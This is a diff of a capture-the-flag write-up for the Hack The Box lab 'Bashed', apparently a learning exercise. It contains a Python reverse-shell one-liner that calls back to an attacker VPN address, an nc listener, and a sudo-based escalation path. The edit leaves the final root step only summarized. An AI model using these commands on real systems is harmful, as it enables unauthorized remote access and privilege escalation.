@@ -1,9 +1,7 @@
 
-
 IP = 10.10.10.68
 
 we right away see a website
-
 
 ```
 sudo nmap -sV 10.10.10.68                                             
@@ -119,39 +117,27 @@ sudo -u scriptmanager ls -la /scripts
 
 We find a Python file named `test.py` owned by `scriptmanager`, which we can modify:
 
-```
-`echo 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])' | sudo -u scriptmanager tee /scripts/test.py > /dev/null`
+```bash
+echo 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])' | sudo -u scriptmanager tee /scripts/test.py > /dev/null
 ```
 Note: `10.10.14.11` is the VPN IP of the attacking machine
 
 ### Listener:
 
-```
+```bash
 nc -lvnp 4444
 ```
 
 ### Trigger the reverse shell:
 
-```
+```bash
 sudo -u scriptmanager python /scripts/test.py
 ```
 
 This gives us a reverse shell as `scriptmanager` on our local machine.
 
-Once inside as `scriptmanager`, we check:
 
-```
-sudo -l
-```
-
-If allowed to run everything:
-
-```
-sudo /bin/bash
-```
-
-Now we are root:
-
+Now check the listener and we should be root!
 ```
 whoami    # root
 cat /root/root.txt
@@ -161,5 +147,6 @@ cat /home/arrexel/user.txt
 ```
 
 
-sum
+### Conclusion
+
 In the _Bashed_ Hack The Box machine, initial access was obtained through an exposed `phpbash.php` web shell running as the low-privileged `www-data` user. During enumeration, it was discovered that `www-data` had misconfigured `sudo` permissions, allowing it to run any command as the `scriptmanager` user without requiring a password. Although direct switching to `scriptmanager` wasn’t possible, we leveraged `sudo -u scriptmanager` to inject a Python reverse shell into a writable script file (`/scripts/test.py`). By triggering this file, we received a reverse shell connection back to our local Mac, this time as `scriptmanager`. From there, a simple privilege escalation was achieved by running `/bin/bash` as root using `sudo`, completing the compromise and granting access to both the user and root flags. This box serves as a lesson in the dangers of exposed dev tools, overly permissive `sudo` rules, and unmonitored script execution paths.
